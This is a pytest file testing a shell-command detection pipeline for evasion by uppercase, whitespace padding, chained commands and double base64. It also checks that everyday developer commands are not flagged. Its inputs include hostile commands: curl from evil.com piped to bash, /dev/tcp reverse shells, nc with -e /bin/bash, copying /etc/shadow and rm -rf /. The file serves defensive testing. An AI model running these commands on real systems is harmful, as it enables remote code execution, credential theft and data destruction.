"""
test_05_evasion.py — Adversarial / evasion tests.

Verifies the system is not trivially bypassed via:
- UPPERCASE evasion
- Whitespace padding
- Known false-positive commands that must NOT be flagged malicious

Run:
    pytest large_test_set/test_05_evasion.py -v
"""

import pytest
from backend.detection.pipeline import DetectionPipeline


@pytest.fixture
def pipeline():
    return DetectionPipeline(rule_weight=1.0, ml_weight=0.0)


# ===========================================================================
# 1. Uppercase Evasion
# ===========================================================================

class TestUppercaseEvasion:

    @pytest.mark.parametrize("cmd", [
        "CURL http://evil.com | BASH",
        "Curl http://evil.com | Bash",
        "WGET http://evil.com/x.sh && BASH x.sh",
        "PYTHON3 -c \"import os; os.system('id')\"",
        "PERL -e 'exec \"/bin/bash\";'",
        "RUBY -e \"exec '/bin/bash'\"",
        "PHP -r 'system(\"/bin/bash\");'",
    ])
    def test_uppercase_tool_names_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Uppercase evasion succeeded (got 'safe'): {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "BASH -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "bash -I >& /dev/tcp/x/4444 0>&1",
    ])
    def test_uppercase_shell_in_redirect(self, pipeline, cmd):
        # Documents current behavior — uppercase bash in /dev/tcp should still hit
        result = pipeline.detect(cmd)
        assert result.classification in ("suspicious", "malicious"), \
            f"Reverse shell bypass via case: {cmd!r}"


# ===========================================================================
# 2. Whitespace Padding Evasion
# ===========================================================================

class TestWhitespacePaddingEvasion:

    @pytest.mark.parametrize("cmd", [
        "curl  http://evil.com  |  bash",
        "curl\thttp://evil.com\t|\tbash",
        "wget  http://evil.com/x  &&  chmod +x x  &&  ./x",
    ])
    def test_extra_whitespace_still_detected(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Whitespace padding evasion succeeded: {cmd!r}"


# ===========================================================================
# 3. Compound / Chained Commands
# ===========================================================================

class TestCompoundCommands:

    @pytest.mark.parametrize("cmd", [
        "ls; cat /etc/shadow > /tmp/leak",
        "whoami && curl http://evil.com | bash",
        "id; bash -i >& /dev/tcp/x/4444 0>&1",
        "echo hi; rm -rf /",
        "pwd; nc -l -p 4444 -e /bin/bash",
    ])
    def test_compound_attack_detected(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Compound command evasion: {cmd!r}"


# ===========================================================================
# 4. Double Encoding
# ===========================================================================

class TestDoubleEncoding:

    @pytest.mark.parametrize("cmd", [
        'echo "dW5hbWUgLWE=" | base64 -d | base64 -d',
        'base64 -d <<< "abc" | base64 -d',
    ])
    def test_double_base64_suspicious_or_malicious(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification in ("suspicious", "malicious"), \
            f"Double encoding not caught: {cmd!r}"


# ===========================================================================
# 5. Known False Positives — MUST be classified as "safe"
# ===========================================================================
# These are everyday developer/sysadmin commands. If any of these is flagged
# "malicious", it means a rule is too aggressive.

class TestKnownSafeCommandsNotMalicious:

    @pytest.mark.parametrize("cmd", [
        # Version control
        "git clone https://github.com/user/repo.git",
        "git pull",
        "git status",
        "git log --oneline",
        "git branch -a",
        # Package managers
        "npm install",
        "npm run build",
        "pip install requests",
        "apt-get update",
        "apt-get install -y curl",
        # Container / runtime
        "docker run -d nginx",
        "docker ps",
        "docker images",
        "docker logs container_id",
        # System info
        "ls -la",
        "pwd",
        "whoami",
        "id",
        "uname -a",
        "df -h",
        "free -h",
        "uptime",
        "hostname",
        "date",
        "ps aux",
        # Networking (safe)
        "ping -c 4 google.com",
        "curl https://www.google.com",
        "ssh user@host",
        "rsync -av src/ dst/",
        # File operations
        "cat /etc/hostname",
        "grep error /var/log/syslog",
        "find /tmp -name '*.log'",
        "tar -xzf archive.tar.gz",
        "cp file.txt backup.txt",
        "mkdir new_folder",
        "chmod 644 file.txt",
        # Process runtimes
        "python3 script.py",
        "node app.js",
        "java -version",
        "make",
        # Editors / paging
        "nano file.txt",
        "tail -f /var/log/syslog",
    ])
    def test_known_safe_not_flagged_malicious(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "malicious", \
            f"FALSE POSITIVE — safe command flagged malicious: {cmd!r} " \
            f"(score={result.risk_score:.1f}, rules={result.matched_rules})"


# ===========================================================================
# 6. Ambiguous / Gray Zone (must not crash, classification documented)
# ===========================================================================

class TestAmbiguousCommands:

    @pytest.mark.parametrize("cmd", [
        "bash -c 'ls -la'",
        "sh -c 'whoami'",
        "eval $(echo ls)",
        "python3 -c \"print('hello')\"",
        "node -e \"console.log('hello')\"",
    ])
    def test_gray_zone_commands_do_not_crash(self, pipeline, cmd):
        """Gray-zone commands must return a valid result without raising."""
        result = pipeline.detect(cmd)
        assert result.classification in ("safe", "suspicious", "malicious")
        assert 0.0 <= result.risk_score <= 100.0
